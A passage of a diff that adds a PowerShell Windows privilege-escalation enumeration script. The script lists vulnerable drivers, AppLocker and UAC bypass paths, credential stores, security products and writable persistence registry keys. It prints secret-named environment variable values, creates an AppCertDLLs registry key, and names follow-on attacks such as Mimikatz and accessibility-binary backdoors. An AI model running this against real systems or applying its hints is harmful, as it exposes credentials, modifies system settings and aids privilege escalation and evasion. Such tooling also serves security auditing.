+    # Known vulnerable drivers (BYOVD)
+    $vulnDrivers = @(
+        "rtcore64.sys", "gdrv.sys", "atillk64.sys", "cpuz141", 
+        "asmmap64.sys", "capcom.sys", "dbutil_2_3.sys"
+    )
+    
+    Write-Finding "`nChecking for vulnerable drivers (BYOVD)..." "Info"
+    $driverList = $drivers | Select-Object -ExpandProperty 'Module Name'
+    foreach ($vuln in $vulnDrivers) {
+        if ($driverList -contains $vuln) {
+            Write-Finding "VULNERABLE DRIVER FOUND: $vuln" "Critical"
+            Write-Finding "  BYOVD attack possible!" "Critical"
+        }
+    }
+    
+} catch {
+    Write-Finding "Error checking drivers: $_" "High"
+}
+
+# ============================================================================
+# APPLOCKER AND WDAC
+# ============================================================================
+Write-SectionHeader "APPLOCKER AND WDAC"
+
+try {
+    Write-Finding "Checking AppLocker..." "Info"
+    
+    $appLockerPolicy = Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue
+    
+    if ($appLockerPolicy) {
+        Write-Finding "AppLocker IS configured!" "Info"
+        
+        foreach ($ruleCollection in $appLockerPolicy.RuleCollections) {
+            Write-Finding "`n$($ruleCollection.RuleCollectionType): $($ruleCollection.EnforcementMode)" "Medium"
+        }
+        
+        # Check common bypass paths
+        Write-Finding "`nChecking AppLocker bypass paths..." "Info"
+        $bypassPaths = @(
+            "C:\Windows\Tasks",
+            "C:\Windows\Temp",
+            "C:\Windows\tracing",
+            "C:\Windows\System32\spool\drivers\color",
+            "C:\Windows\System32\spool\printers",
+            "C:\Windows\System32\spool\servers",
+            "C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys",
+            "C:\Windows\System32\Tasks",
+            "C:\ProgramData"
+        )
+        
+        foreach ($path in $bypassPaths) {
+            if (Test-Path $path) {
+                try {
+                    $testFile = Join-Path $path "test.exe"
+                    [System.IO.File]::Create($testFile).Close()
+                    Remove-Item $testFile -ErrorAction SilentlyContinue
+                    Write-Finding "WRITABLE bypass path: $path" "Critical"
+                } catch {}
+            }
+        }
+    } else {
+        Write-Finding "AppLocker NOT configured" "Info"
+    }
+    
+} catch {
+    Write-Finding "Error checking AppLocker: $_" "High"
+}
+
+# ============================================================================
+# FILE SYSTEM TRICKS
+# ============================================================================
+Write-SectionHeader "FILE SYSTEM TRICKS"
+
+try {
+    Write-Finding "Checking for file system tricks..." "Info"
+    
+    # Symbolic links and junctions
+    Write-Finding "`nChecking for symbolic links/junctions:" "Info"
+    $commonPaths = @("C:\", "C:\Windows", "C:\Program Files")
+    
+    foreach ($path in $commonPaths) {
+        if (Test-Path $path) {
+            Get-ChildItem $path -Force -ErrorAction SilentlyContinue | 
+                Where-Object {$_.Attributes -match "ReparsePoint"} | 
+                Select-Object -First 10 | 
+                ForEach-Object {
+                    Write-Finding "  Reparse Point: $($_.FullName)" "Medium"
+                }
+        }
+    }
+    
+} catch {
+    Write-Finding "Error checking file system: $_" "High"
+}
+
+# ============================================================================
+# ENVIRONMENT VARIABLES
+# ============================================================================
+Write-SectionHeader "ENVIRONMENT VARIABLES"
+
+try {
+    Write-Finding "Checking environment variables..." "Info"
+    
+    $envVars = Get-ChildItem Env:
+    
+    foreach ($var in $envVars) {
+        if ($var.Name -match "PASSWORD|PWD|SECRET|KEY|TOKEN|API|CREDENTIAL") {
+            Write-Finding "Suspicious: $($var.Name) = $($var.Value)" "High"
+        }
+    }
+    
+    if ($env:PATH -match "^\.;|;\.;|;\.$") {
+        Write-Finding "`nCurrent directory in PATH!" "Critical"
+        Write-Finding "  Exploit: DLL hijacking via current directory" "Critical"
+    }
+    
+} catch {
+    Write-Finding "Error checking environment: $_" "High"
+}
+
+# ============================================================================
+# FIREWALL STATUS
+# ============================================================================
+Write-SectionHeader "FIREWALL CONFIGURATION"
+
+try {
+    Write-Finding "Checking firewall..." "Info"
+    
+    $profiles = Get-NetFirewallProfile -ErrorAction SilentlyContinue
+    foreach ($profile in $profiles) {
+        Write-Finding "`n$($profile.Name) Profile:" "Info"
+        Write-Finding "  Enabled: $($profile.Enabled)" "Info"
+        
+        if (-not $profile.Enabled) {
+            Write-Finding "  ^-- FIREWALL DISABLED!" "Critical"
+        }
+        
+        Write-Finding "  Default Inbound: $($profile.DefaultInboundAction)" "Info"
+        Write-Finding "  Default Outbound: $($profile.DefaultOutboundAction)" "Info"
+    }
+    
+} catch {
+    Write-Finding "Error checking firewall: $_" "High"
+}
+
+# ============================================================================
+# WSL CHECK
+# ============================================================================
+Write-SectionHeader "WINDOWS SUBSYSTEM FOR LINUX"
+
+try {
+    Write-Finding "Checking WSL..." "Info"
+    
+    $wsl = Get-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux -ErrorAction SilentlyContinue
+    
+    if ($wsl.State -eq "Enabled") {
+        Write-Finding "WSL IS INSTALLED!" "High"
+        Write-Finding "  Potential Linux escape vector" "High"
+        
+        try {
+            $distros = wsl.exe -l -v 2>$null
+            if ($distros) {
+                Write-Finding "`nDistributions:" "High"
+                $distros | ForEach-Object { Write-Finding $_ "Info" }
+            }
+        } catch {}
+    } else {
+        Write-Finding "WSL not installed" "Info"
+    }
+    
+} catch {
+    Write-Finding "Error checking WSL: $_" "High"
+}
+
+# ============================================================================
+# JUICY FOLDERS AND FILES
+# ============================================================================
+Write-SectionHeader "JUICY FOLDERS AND SENSITIVE FILES"
+
+try {
+    Write-Finding "Searching sensitive locations..." "Info"
+    
+    # Desktop
+    Write-Finding "`nDesktop files:" "Info"
+    Get-ChildItem "$env:USERPROFILE\Desktop" -File -ErrorAction SilentlyContinue | 
+        Where-Object {$_.Extension -match "\.txt|\.doc|\.docx|\.xls|\.xlsx|\.key|\.pem|\.ppk|\.pdf"} | 
+        Select-Object -First 20 | 
+        ForEach-Object {
+            Write-Finding "  $($_.Name)" "Medium"
+        }
+    
+    # SSH keys
+    if (Test-Path "$env:USERPROFILE\.ssh") {
+        Write-Finding "`nSSH directory found!" "High"
+        Get-ChildItem "$env:USERPROFILE\.ssh" -File -ErrorAction SilentlyContinue | ForEach-Object {
+            Write-Finding "  $($_.Name)" "High"
+        }
+    }
+    
+    # AWS credentials
+    if (Test-Path "$env:USERPROFILE\.aws") {
+        Write-Finding "`nAWS credentials found!" "Critical"
+        Get-ChildItem "$env:USERPROFILE\.aws" -File -ErrorAction SilentlyContinue | ForEach-Object {
+            Write-Finding "  $($_.Name)" "Critical"
+        }
+    }
+    
+    # Azure
+    if (Test-Path "$env:USERPROFILE\.azure") {
+        Write-Finding "`nAzure CLI credentials found!" "Critical"
+    }
+    
+    # Docker
+    if (Test-Path "$env:USERPROFILE\.docker\config.json") {
+        Write-Finding "`nDocker config found!" "High"
+    }
+    
+    # KeePass databases
+    Write-Finding "`nSearching for password databases..." "Info"
+    Get-ChildItem "$env:USERPROFILE" -Filter "*.kdbx" -Recurse -ErrorAction SilentlyContinue -Depth 3 | 
+        Select-Object -First 10 | 
+        ForEach-Object {
+            Write-Finding "KeePass DB: $($_.FullName)" "Critical"
+        }
+    
+} catch {
+    Write-Finding "Error searching folders: $_" "High"
+}
+
+# ============================================================================
+# UAC BYPASS DETECTION
+# ============================================================================
+Write-SectionHeader "UAC BYPASS OPPORTUNITIES"
+
+try {
+    Write-Finding "Checking for UAC bypass vectors..." "Info"
+    
+    $uac = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -ErrorAction SilentlyContinue
+    
+    if ($uac.ConsentPromptBehaviorAdmin -eq 0) {
+        Write-Finding "UAC set to never notify - bypasses trivial!" "Critical"
+    }
+    
+    # Check for fodhelper bypass opportunity
+    $fodhelperPath = "C:\Windows\System32\fodhelper.exe"
+    if (Test-Path $fodhelperPath) {
+        Write-Finding "fodhelper.exe present - UAC bypass possible via registry" "High"
+        Write-Finding "  HKCU:\Software\Classes\ms-settings\shell\open\command" "High"
+    }
+    
+    # Check for eventvwr bypass
+    $eventvwrPath = "C:\Windows\System32\eventvwr.msc"
+    if (Test-Path $eventvwrPath) {
+        Write-Finding "eventvwr.msc present - UAC bypass via registry hijack" "High"
+        Write-Finding "  HKCU:\Software\Classes\mscfile\shell\open\command" "High"
+    }
+    
+    Write-Finding "`nNote: 30+ UAC bypasses exist - check FodHelper, EventVwr, SilentCleanup, etc" "Info"
+    
+} catch {
+    Write-Finding "Error checking UAC bypasses: $_" "High"
+}
+
+# ============================================================================
+# ACTIVE DIRECTORY ENUMERATION
+# ============================================================================
+Write-SectionHeader "ACTIVE DIRECTORY ENUMERATION"
+
+try {
+    Write-Finding "Checking domain membership..." "Info"
+    
+    $domain = $env:USERDOMAIN
+    $computerSystem = Get-WmiObject Win32_ComputerSystem
+    
+    if ($computerSystem.PartOfDomain) {
+        Write-Finding "System IS domain-joined!" "High"
+        Write-Finding "  Domain: $($computerSystem.Domain)" "High"
+        
+        # LAPS check
+        Write-Finding "`nChecking for LAPS..." "Info"
+        $lapsKey = "HKLM:\SOFTWARE\Policies\Microsoft Services\AdmPwd"
+        if (Test-Path $lapsKey) {
+            Write-Finding "LAPS IS configured!" "Info"
+        } else {
+            Write-Finding "LAPS NOT configured - local admin passwords may be identical across domain" "High"
+        }
+        
+        # Kerberos tickets
+        Write-Finding "`nChecking Kerberos tickets..." "Info"
+        try {
+            $tickets = klist 2>$null
+            if ($tickets) {
+                Write-Finding "Kerberos tickets present:" "Medium"
+                $tickets | Select-Object -First 20 | ForEach-Object {
+                    Write-Finding $_ "Info"
+                }
+            }
+        } catch {}
+        
+        Write-Finding "`nNote: Use Bloodhound/SharpHound for complete AD enumeration" "Info"
+        
+    } else {
+        Write-Finding "System is NOT domain-joined (workgroup)" "Info"
+    }
+    
+} catch {
+    Write-Finding "Error in AD enumeration: $_" "High"
+}
+
+# ============================================================================
+# GROUP POLICY ANALYSIS
+# ============================================================================
+Write-SectionHeader "GROUP POLICY ANALYSIS"
+
+try {
+    Write-Finding "Checking Group Policy..." "Info"
+    
+    if ($computerSystem.PartOfDomain) {
+        Write-Finding "Checking for GPP passwords..." "Info"
+        Write-Finding "Search SYSVOL for: Groups.xml, ScheduledTasks.xml, Services.xml" "High"
+        Write-Finding "These may contain cpassword attributes with encrypted passwords" "High"
+    }
+    
+    # GPO cache
+    $gpoCache = "C:\Windows\System32\GroupPolicy"
+    if (Test-Path $gpoCache) {
+        Write-Finding "`nGPO cache exists at: $gpoCache" "Info"
+        try {
+            $testFile = Join-Path $gpoCache "test.txt"
+            [System.IO.File]::Create($testFile).Close()
+            Remove-Item $testFile -ErrorAction SilentlyContinue
+            Write-Finding "  ^-- GPO directory is WRITABLE!" "Critical"
+        } catch {}
+    }
+    
+} catch {
+    Write-Finding "Error checking GPO: $_" "High"
+}
+
+# ============================================================================
+# WMI PERSISTENCE
+# ============================================================================
+Write-SectionHeader "WMI PERSISTENCE CHECK"
+
+try {
+    Write-Finding "Checking WMI event consumers..." "Info"
+    
+    $filters = Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue
+    if ($filters) {
+        Write-Finding "WMI Event Filters found: $($filters.Count)" "Medium"
+        foreach ($filter in ($filters | Select-Object -First 10)) {
+            Write-Finding "  Filter: $($filter.Name)" "Medium"
+        }
+    }
+    
+    $consumers = Get-WmiObject -Namespace root\subscription -Class __EventConsumer -ErrorAction SilentlyContinue
+    if ($consumers) {
+        Write-Finding "WMI Event Consumers found: $($consumers.Count)" "Medium"
+    }
+    
+    $bindings = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue
+    if ($bindings) {
+        Write-Finding "WMI Bindings found: $($bindings.Count)" "High"
+        Write-Finding "  WMI persistence may be configured!" "High"
+    }
+    
+} catch {
+    Write-Finding "Error checking WMI: $_" "High"
+}
+
+# ============================================================================
+# ACCESSIBILITY FEATURES HIJACKING
+# ============================================================================
+Write-SectionHeader "ACCESSIBILITY FEATURES"
+
+try {
+    Write-Finding "Checking accessibility features for hijacking..." "Info"
+    
+    $accessibilityFeatures = @{
+        "C:\Windows\System32\sethc.exe" = "Sticky Keys"
+        "C:\Windows\System32\utilman.exe" = "Utility Manager"
+        "C:\Windows\System32\osk.exe" = "On-Screen Keyboard"
+        "C:\Windows\System32\Magnify.exe" = "Magnifier"
+        "C:\Windows\System32\Narrator.exe" = "Narrator"
+        "C:\Windows\System32\DisplaySwitch.exe" = "Display Switch"
+        "C:\Windows\System32\AtBroker.exe" = "Ease of Access"
+    }
+    
+    foreach ($feature in $accessibilityFeatures.Keys) {
+        if (Test-Path $feature) {
+            try {
+                $testFile = $feature + ".test"
+                [System.IO.File]::Create($testFile).Close()
+                Remove-Item $testFile -ErrorAction SilentlyContinue
+                Write-Finding "WRITABLE: $($accessibilityFeatures[$feature]) at $feature" "Critical"
+                Write-Finding "  Can replace with cmd.exe for RDP/console backdoor" "Critical"
+            } catch {}
+            
+            # Check if already replaced
+            $fileHash = Get-FileHash $feature -Algorithm MD5 -ErrorAction SilentlyContinue
+            $cmdHash = Get-FileHash "C:\Windows\System32\cmd.exe" -Algorithm MD5 -ErrorAction SilentlyContinue
+            if ($fileHash.Hash -eq $cmdHash.Hash) {
+                Write-Finding "BACKDOOR DETECTED: $($accessibilityFeatures[$feature]) is cmd.exe!" "Critical"
+            }
+        }
+    }
+    
+} catch {
+    Write-Finding "Error checking accessibility features: $_" "High"
+}
+
+# ============================================================================
+# BITS JOBS
+# ============================================================================
+Write-SectionHeader "BITS JOBS"
+
+try {
+    Write-Finding "Checking BITS jobs..." "Info"
+    
+    $bitsJobs = Get-BitsTransfer -AllUsers -ErrorAction SilentlyContinue
+    if ($bitsJobs) {
+        Write-Finding "BITS jobs found: $($bitsJobs.Count)" "Medium"
+        foreach ($job in ($bitsJobs | Select-Object -First 10)) {
+            Write-Finding "  Job: $($job.DisplayName) - $($job.JobState)" "Medium"
+        }
+    }
+    
+} catch {
+    Write-Finding "Error checking BITS: $_" "High"
+}
+
+# ============================================================================
+# CERTIFICATE STORE
+# ============================================================================
+Write-SectionHeader "CERTIFICATE STORE"
+
+try {
+    Write-Finding "Checking certificate stores..." "Info"
+    
+    # Current user certificates
+    $userCerts = Get-ChildItem Cert:\CurrentUser\My -ErrorAction SilentlyContinue
+    if ($userCerts) {
+        Write-Finding "User certificates: $($userCerts.Count)" "Medium"
+        foreach ($cert in ($userCerts | Select-Object -First 10)) {
+            if ($cert.HasPrivateKey) {
+                Write-Finding "  Certificate with private key: $($cert.Subject)" "High"
+            }
+        }
+    }
+    
+    # Machine certificates
+    $machineCerts = Get-ChildItem Cert:\LocalMachine\My -ErrorAction SilentlyContinue
+    if ($machineCerts) {
+        Write-Finding "`nMachine certificates: $($machineCerts.Count)" "Medium"
+        foreach ($cert in ($machineCerts | Select-Object -First 10)) {
+            if ($cert.HasPrivateKey) {
+                Write-Finding "  Certificate with private key: $($cert.Subject)" "High"
+            }
+        }
+    }
+    
+} catch {
+    Write-Finding "Error checking certificates: $_" "High"
+}
+
+# ============================================================================
+# FILE ASSOCIATION HIJACKING
+# ============================================================================
+Write-SectionHeader "FILE ASSOCIATION HIJACKING"
+
+try {
+    Write-Finding "Checking file associations..." "Info"
+    
+    $fileTypes = @(".txt", ".pdf", ".doc", ".xls", ".jpg")
+    
+    foreach ($ext in $fileTypes) {
+        $assoc = cmd /c assoc $ext 2>$null
+        if ($assoc) {
+            Write-Finding "Association: $assoc" "Info"
+        }
+    }
+    
+    # Check if user can modify file associations
+    $userClassesRoot = "HKCU:\Software\Classes"
+    if (Test-Path $userClassesRoot) {
+        try {
+            New-ItemProperty -Path $userClassesRoot -Name "TestPermission" -Value "test" -ErrorAction Stop | Out-Null
+            Remove-ItemProperty -Path $userClassesRoot -Name "TestPermission" -ErrorAction SilentlyContinue
+            Write-Finding "User CAN modify file associations!" "High"
+        } catch {}
+    }
+    
+} catch {
+    Write-Finding "Error checking file associations: $_" "High"
+}
+
+# ============================================================================
+# SECURITY PRODUCTS DETECTION
+# ============================================================================
+Write-SectionHeader "SECURITY PRODUCTS DETECTION"
+
+try {
+    Write-Finding "Detecting security products..." "Info"
+    
+    # Antivirus
+    $av = Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct -ErrorAction SilentlyContinue
+    if ($av) {
+        Write-Finding "`nAntivirus Products:" "Info"
+        foreach ($product in $av) {
+            Write-Finding "  $($product.displayName)" "Info"
+        }
+    }
+    
+    # Common EDR/AV processes
+    $securityProcs = @("MsMpEng", "NisSrv", "cb", "CylanceSvc", "CSFalconService", "SentinelOne")
+    
+    $runningProcs = Get-Process | Select-Object -ExpandProperty Name
+    Write-Finding "`nSecurity processes detected:" "Info"
+    foreach ($proc in $securityProcs) {
+        if ($runningProcs -contains $proc) {
+            Write-Finding "  $proc is running!" "Medium"
+        }
+    }
+    
+    # Sysmon
+    $sysmon = Get-Service sysmon* -ErrorAction SilentlyContinue
+    if ($sysmon) {
+        Write-Finding "`nSysmon IS installed!" "Info"
+    }
+    
+} catch {
+    Write-Finding "Error detecting security products: $_" "High"
+}
+
+# ============================================================================
+# NETWORK SHARES
+# ============================================================================
+Write-SectionHeader "NETWORK SHARES"
+
+try {
+    Write-Finding "Enumerating network shares..." "Info"
+    
+    # Local shares
+    $shares = Get-SmbShare -ErrorAction SilentlyContinue
+    if ($shares) {
+        Write-Finding "Local shares:" "Info"
+        foreach ($share in $shares) {
+            Write-Finding "  $($share.Name): $($share.Path)" "Medium"
+        }
+    }
+    
+    # Mapped drives
+    $drives = Get-PSDrive -PSProvider FileSystem | Where-Object {$_.DisplayRoot}
+    if ($drives) {
+        Write-Finding "`nMapped network drives:" "Info"
+        foreach ($drive in $drives) {
+            Write-Finding "  $($drive.Name): -> $($drive.DisplayRoot)" "Medium"
+        }
+    }
+    
+} catch {
+    Write-Finding "Error enumerating shares: $_" "High"
+}
+
+# ============================================================================
+# ADDITIONAL PERSISTENCE LOCATIONS
+# ============================================================================
+Write-SectionHeader "ADDITIONAL PERSISTENCE LOCATIONS"
+
+try {
+    Write-Finding "Checking additional persistence locations..." "Info"
+    
+    # Screensaver
+    $screensaver = Get-ItemProperty "HKCU:\Control Panel\Desktop" -Name SCRNSAVE.EXE -ErrorAction SilentlyContinue
+    if ($screensaver.'SCRNSAVE.EXE') {
+        Write-Finding "Screensaver configured: $($screensaver.'SCRNSAVE.EXE')" "Medium"
+    }
+    
+    # Logon scripts
+    $logonScript = Get-ItemProperty "HKCU:\Environment" -Name UserInitMprLogonScript -ErrorAction SilentlyContinue
+    if ($logonScript.UserInitMprLogonScript) {
+        Write-Finding "User logon script: $($logonScript.UserInitMprLogonScript)" "High"
+    }
+    
+    # Boot execute
+    $bootExecute = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name BootExecute -ErrorAction SilentlyContinue
+    if ($bootExecute.BootExecute) {
+        Write-Finding "Boot execute entries:" "Info"
+        $bootExecute.BootExecute | ForEach-Object {
+            Write-Finding "  $_" "Info"
+        }
+    }
+    
+    # App Init DLLs
+    $appInit = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name AppInit_DLLs -ErrorAction SilentlyContinue
+    if ($appInit.AppInit_DLLs) {
+        Write-Finding "AppInit_DLLs configured: $($appInit.AppInit_DLLs)" "High"
+    }
+    
+    # IFEO
+    $ifeo = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
+    if (Test-Path $ifeo) {
+        $debuggers = Get-ChildItem $ifeo -ErrorAction SilentlyContinue | 
+                     Get-ItemProperty -Name Debugger -ErrorAction SilentlyContinue |
+                     Where-Object {$_.Debugger}
+        
+        if ($debuggers) {
+            Write-Finding "`nIFEO Debuggers found:" "High"
+            foreach ($dbg in ($debuggers | Select-Object -First 10)) {
+                Write-Finding "  $($dbg.PSChildName): $($dbg.Debugger)" "High"
+            }
+        }
+    }
+    
+} catch {
+    Write-Finding "Error checking persistence locations: $_" "High"
+}
+
+# ============================================================================
+# BITLOCKER STATUS
+# ============================================================================
+Write-SectionHeader "BITLOCKER STATUS"
+
+try {
+    Write-Finding "Checking BitLocker encryption..." "Info"
+    
+    $volumes = Get-BitLockerVolume -ErrorAction SilentlyContinue
+    if ($volumes) {
+        foreach ($vol in $volumes) {
+            Write-Finding "`nVolume $($vol.MountPoint):" "Info"
+            Write-Finding "  Protection Status: $($vol.ProtectionStatus)" "Info"
+            Write-Finding "  Encryption Percentage: $($vol.EncryptionPercentage)%" "Info"
+            
+            if ($vol.ProtectionStatus -eq "Off") {
+                Write-Finding "  ^-- BitLocker NOT enabled!" "Medium"
+            }
+        }
+    } else {
+        Write-Finding "BitLocker not configured" "Info"
+    }
+    
+} catch {
+    Write-Finding "Error checking BitLocker: $_" "High"
+}
+
+# ============================================================================
+# CACHED CREDENTIALS CHECK
+# ============================================================================
+Write-SectionHeader "CACHED CREDENTIALS"
+
+try {
+    Write-Finding "Checking for cached credentials..." "Info"
+    
+    Write-Finding "LSA Secrets location: HKLM\SECURITY\Policy\Secrets" "Info"
+    Write-Finding "  Use Mimikatz or similar to extract" "Info"
+    
+    # Credential Manager
+    Write-Finding "`nWindows Credential Manager:" "Info"
+    $vaultCmd = vaultcmd /listcreds:"Windows Credentials" /all 2>$null
+    if ($vaultCmd) {
+        Write-Finding "Credentials in Vault:" "High"
+        $vaultCmd | Select-Object -First 30 | ForEach-Object {
+            Write-Finding $_ "High"
+        }
+    }
+    
+    # Saved credentials
+    $savedCreds = cmdkey /list 2>$null
+    if ($savedCreds -and $savedCreds.Length -gt 0) {
+        Write-Finding "`nSaved credentials found:" "High"
+        $savedCreds | ForEach-Object { Write-Finding $_ "High" }
+    }
+    
+} catch {
+    Write-Finding "Error checking cached credentials: $_" "High"
+}
+
+# ============================================================================
+# LOLBAS BINARIES CHECK
+# ============================================================================
+Write-SectionHeader "LOLBAS BINARIES (Living Off The Land)"
+
+try {
+    Write-Finding "Checking for LOLBAS binaries..." "Info"
+    
+    $lolbasBinaries = @{
+        "C:\Windows\System32\certutil.exe" = "Download files, encode/decode"
+        "C:\Windows\System32\bitsadmin.exe" = "Download files, persistence"
+        "C:\Windows\System32\regsvr32.exe" = "Execute DLLs/scriptlets"
+        "C:\Windows\System32\mshta.exe" = "Execute HTA/JavaScript"
+        "C:\Windows\System32\rundll32.exe" = "Execute DLLs"
+        "C:\Windows\System32\wmic.exe" = "Execute commands, lateral movement"
+        "C:\Windows\System32\msbuild.exe" = "Execute C# code"
+        "C:\Windows\System32\installutil.exe" = "Execute .NET"
+        "C:\Windows\System32\regasm.exe" = "Execute .NET"
+    }
+    
+    foreach ($binary in $lolbasBinaries.Keys) {
+        if (Test-Path $binary) {
+            Write-Finding "Available: $(Split-Path $binary -Leaf) - $($lolbasBinaries[$binary])" "Medium"
+        }
+    }
+    
+} catch {
+    Write-Finding "Error checking LOLBAS: $_" "High"
+}
+
+# ============================================================================
+# PORT MONITORS (T1547.010) - CRITICAL MISSING
+# ============================================================================
+Write-SectionHeader "PORT MONITORS (T1547.010)"
+
+try {
+    Write-Finding "Checking Port Monitors..." "Info"
+    
+    $portMonitorKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Monitors"
+    
+    if (Test-Path $portMonitorKey) {
+        $monitors = Get-ChildItem $portMonitorKey -ErrorAction SilentlyContinue
+        
+        foreach ($monitor in $monitors) {
+            $props = Get-ItemProperty $monitor.PSPath -ErrorAction SilentlyContinue
+            
+            if ($props.Driver) {
+                Write-Finding "Port Monitor: $($monitor.PSChildName)" "Medium"
+                Write-Finding "  Driver: $($props.Driver)" "Medium"
+            }
+        }
+        
+        try {
+            New-ItemProperty -Path $portMonitorKey -Name "TestMonitor" -Value "test" -ErrorAction Stop | Out-Null
+            Remove-ItemProperty -Path $portMonitorKey -Name "TestMonitor" -ErrorAction SilentlyContinue
+            Write-Finding "Can ADD new port monitors!" "Critical"
+            Write-Finding "  Exploit: Add malicious port monitor for SYSTEM execution" "Critical"
+        } catch {}
+    }
+    
+} catch {
+    Write-Finding "Error checking port monitors: $_" "High"
+}
+
+# ============================================================================
+# PRINT PROCESSORS (T1547.012)
+# ============================================================================
+Write-SectionHeader "PRINT PROCESSORS (T1547.012)"
+
+try {
+    Write-Finding "Checking Print Processors..." "Info"
+    
+    $printProcKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors"
+    
+    if (Test-Path $printProcKey) {
+        $processors = Get-ChildItem $printProcKey -ErrorAction SilentlyContinue
+        Write-Finding "Print Processors found: $($processors.Count)" "Info"
+    }
+    
+} catch {
+    Write-Finding "Error checking print processors: $_" "High"
+}
+
+# ============================================================================
+# AUTHENTICATION PACKAGES (T1547.002) - CRITICAL
+# ============================================================================
+Write-SectionHeader "AUTHENTICATION PACKAGES (T1547.002)"
+
+try {
+    Write-Finding "Checking LSA Authentication Packages..." "Info"
+    
+    $lsaKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
+    $lsaProps = Get-ItemProperty $lsaKey -ErrorAction SilentlyContinue
+    
+    if ($lsaProps.'Authentication Packages') {
+        Write-Finding "Authentication Packages configured:" "High"
+        $lsaProps.'Authentication Packages' | ForEach-Object {
+            Write-Finding "  $_" "High"
+        }
+        Write-Finding "These DLLs have access to plaintext passwords!" "High"
+    }
+    
+    try {
+        New-ItemProperty -Path $lsaKey -Name "TestAuthPackage" -Value "test" -ErrorAction Stop | Out-Null
+        Remove-ItemProperty -Path $lsaKey -Name "TestAuthPackage" -ErrorAction SilentlyContinue
+        Write-Finding "LSA key is WRITABLE - can add malicious auth package!" "Critical"
+    } catch {}
+    
+} catch {
+    Write-Finding "Error checking authentication packages: $_" "High"
+}
+
+# ============================================================================
+# SECURITY SUPPORT PROVIDER (T1547.005) - CRITICAL  
+# ============================================================================
+Write-SectionHeader "SECURITY SUPPORT PROVIDERS (T1547.005)"
+
+try {
+    Write-Finding "Checking Security Support Providers..." "Info"
+    
+    $lsaKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
+    $lsaProps = Get-ItemProperty $lsaKey -ErrorAction SilentlyContinue
+    
+    if ($lsaProps.'Security Packages') {
+        Write-Finding "Security Packages configured:" "Critical"
+        $lsaProps.'Security Packages' | ForEach-Object {
+            Write-Finding "  $_" "High"
+        }
+    }
+    
+    Write-Finding "SSPs can access plaintext domain passwords!" "High"
+    
+} catch {
+    Write-Finding "Error checking SSPs: $_" "High"
+}
+
+# ============================================================================
+# ACTIVE SETUP (T1547.014) - CRITICAL
+# ============================================================================
+Write-SectionHeader "ACTIVE SETUP (T1547.014)"
+
+try {
+    Write-Finding "Checking Active Setup..." "Info"
+    
+    $activeSetupKeys = @(
+        "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components",
+        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Active Setup\Installed Components"
+    )
+    
+    foreach ($key in $activeSetupKeys) {
+        if (Test-Path $key) {
+            $components = Get-ChildItem $key -ErrorAction SilentlyContinue
+            
+            foreach ($comp in ($components | Select-Object -First 15)) {
+                $props = Get-ItemProperty $comp.PSPath -ErrorAction SilentlyContinue
+                
+                if ($props.StubPath) {
+                    Write-Finding "  Component: $($comp.PSChildName)" "Medium"
+                    Write-Finding "    StubPath: $($props.StubPath)" "Medium"
+                }
+            }
+            
+            try {
+                New-Item -Path $key -Name "{TestGUID-1234}" -ErrorAction Stop | Out-Null
+                Remove-Item -Path "$key\{TestGUID-1234}" -ErrorAction SilentlyContinue
+                Write-Finding "Can ADD Active Setup components!" "Critical"
+                Write-Finding "  Runs for every user on login!" "Critical"
+            } catch {}
+        }
+    }
+    
+} catch {
+    Write-Finding "Error checking Active Setup: $_" "High"
+}
+
+# ============================================================================
+# NETSH HELPER DLL (T1546.007) - CRITICAL
+# ============================================================================
+Write-SectionHeader "NETSH HELPER DLL (T1546.007)"
+
+try {
+    Write-Finding "Checking Netsh Helper DLLs..." "Info"
+    
+    $netshKey = "HKLM:\SOFTWARE\Microsoft\Netsh"
+    
+    if (Test-Path $netshKey) {
+        $helpers = Get-ItemProperty $netshKey -ErrorAction SilentlyContinue
+        
+        if ($helpers) {
+            Write-Finding "Netsh helpers configured:" "High"
+            $helpers.PSObject.Properties | Where-Object {$_.Name -notmatch "^PS"} | ForEach-Object {
+                Write-Finding "  $($_.Name): $($_.Value)" "High"
+            }
+        }
+        
+        try {
+            New-ItemProperty -Path $netshKey -Name "TestHelper" -Value "test.dll" -ErrorAction Stop | Out-Null
+            Remove-ItemProperty -Path $netshKey -Name "TestHelper" -ErrorAction SilentlyContinue
+            Write-Finding "Netsh registry is WRITABLE!" "Critical"
+        } catch {}
+    }
+    
+} catch {
+    Write-Finding "Error checking Netsh helpers: $_" "High"
+}
+
+# ============================================================================
+# APPCERT DLLs (T1546.009)
+# ============================================================================
+Write-SectionHeader "APPCERT DLLs (T1546.009)"
+
+try {
+    Write-Finding "Checking AppCert DLLs..." "Info"
+    
+    $appCertKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDLLs"
+    
+    if (Test-Path $appCertKey) {
+        Write-Finding "AppCertDLLs key EXISTS!" "High"
+        
+        $dlls = Get-ItemProperty $appCertKey -ErrorAction SilentlyContinue
+        
+        if ($dlls) {
+            $dlls.PSObject.Properties | Where-Object {$_.Name -notmatch "^PS"} | ForEach-Object {
+                Write-Finding "  AppCert DLL: $($_.Value)" "Critical"
+            }
+        }
+        
+        Write-Finding "AppCert DLLs are loaded into EVERY process!" "High"
+    } else {
+        try {
+            New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name "AppCertDLLs" -ErrorAction Stop | Out-Null
+            Write-Finding "Created AppCertDLLs key successfully!" "Critical"
